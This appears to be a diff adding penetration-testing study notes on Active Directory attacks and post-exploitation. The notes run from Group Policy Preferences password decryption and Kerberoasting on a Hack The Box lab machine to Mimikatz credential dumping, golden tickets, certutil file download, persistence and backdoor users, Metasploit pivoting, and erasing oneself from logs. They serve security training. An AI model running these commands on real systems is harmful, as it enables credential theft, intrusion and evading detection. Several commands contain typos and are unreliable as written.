@@ -459,16 +459,147 @@ https://medium.com/@Shorty420/kerberoasting-9108477279cc
 
 Group Policy Pwnage: https://blog.rapid7.com/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/
 
+* Group Policy Preferences allowed admins to create policies using embeded credentials
+* These credentials were encrypted and placed in a "cPassword"
+* The key was accidentally released (whoops)
+* Patched in MS14-025, but doesn't prevent previous uses
 
 
+### Abusing GPP
 
 
+* Using Hack the box **Active** (10.10.10.100) machine
+
+* when we scan against a DC we see port 53, 88, 389,445 open
+
+* ```smbclient -L \\\\10.10.10.100\\ ```
+
+* ```smbclient  \\\\10.10.10.100\\Replication ```
+
+* ``` smb: \> prompt off ```
+
+* ``` smb: \> recurse on  ```
+
+* ``` smb: \> mget * ```
+
+* open the Group.xml
+
+* decrypt it using gpp-decrypt
+
+* this is not a system level user , so we need to use 
+
+* ```psexec.py active.htb/svc_tgs:asdfyhjadiqiwd@10.10.10.100 ```
+
+* lets try kerbrosting : ```GetUsersSPNs.py active.htb/svc_tgs:password -dc-ip 10.10.10.100 -request ```
+
+* now we have a service ticket ,so we need to crack this 
+
+* ```hashcat -m 13100 hashes.txt rockyou.txt ```
+
+* ```psexec.py active.htb/Administrator:Ticket1968@10.10.10.100 ```
 
 
+### Mimikatz Overview
+
+Mimikatz: https://github.com/gentilkiwi/mimikatz
+
+* tool used to view and steal credentials, generate kerberos tickets, and leverage attacks
+* Dumps creds stored in memory
+* Just few attacks: Credential Dumping, Pass-the_Hash, Over-Pass-the-Hash, Pass-the Ticket, Golden Ticket,Silver Ticket
 
 
+* Invoke-Mimikatz is used to bypasas the antivirus
 
 
+### Credential Dumping with Mimikatz
+
+* extract mimikatz to folder
+* look through different modules in modules
+
+* ```mimikatz.exe ```
+* ```privilage::debug ``` 
+* ```sekurlsa::logonpassword```
+* ```lsadump::sam ```
+* ```lsadump::lsa /patch ```
+
+
+### Golden Ticket Attacks
+
+* ```mimikatz.exe ```
+* ```privilage::debug ```
+* ```lsadump::lsa /inject /name:krbtgt ```
+
+* ```kerberos::golden /User:Administrator /domain:marvel.local /sid:S-!-S...... /krbtgt:1fff1a64..... /id:500 /ptt ```
+
+* ```misc::cmd ```
+* ``` dir \\THEPUNISHER\C$ ```
+* ```psexec.exe \\THEPUNISHER cmd ```
+*
+
+
+### Conclusion and Additional Resources
+
+* Active Directory Security Blog: https://adsecurity.org/
+
+* Harmj0y Blog: http://blog.harmj0y.net/
+
+* Pentester Academy Active Directory: https://www.pentesteracademy.com/activedirectorylab
+
+* Pentester Academy Red Team Labs: https://www.pentesteracademy.com/redteamlab
+
+* eLS PTX: https://www.elearnsecurity.com/course/penetration_testing_extreme/
+
+
+## Post Exploitation
+
+### File Transfers Review
+
+* Certutil
+  * certutil.exe -urlcache -f http://10.10.10.10/file.txt file.txt
+* HTTP
+  * python -m SimpleHTTPServer 80
+* Browser
+  * Navigate directly to file 
+* FTP
+  * python -m pyftpdlib 21 (attacker machine)
+  * ftp 10.10.10.10
+* Linux
+  * wget
+
+
+### Maintaining Access Overview
+
+* Persistence Scripts
+  * run persistence -h 
+  * exploit/window/local/persistence
+  * exploit/window/local/registry_persistence
+* Schedule Tasks
+  * run scheduleme
+  * run schtaskabuse
+* Add a user 
+  * net user hacker password123 /add
+  
+### Pivoting Walkthrough
+
+* ```msfconsole ```
+* ``` exploit/window/psexec ```
+* ```> shell ``` 
+* ```route print ```
+* ```arp -a ```
+* ```run autoroute -s 10.10.10.0/24 ```
+* ```run autoroute -p ```
+* ```background ```
+* ```auxilary/scanner/portscan/tcp ```
+
+### Cleaning Up
+
+* make the system/network as it was when you entered it 
+  * Remove executables, script, amd added files
+  * Remove malware, rootkits, and added user accounts
+  * Set settings back to original configurations
+  
+ * eleminate youself from logfile
+  
 
 
 
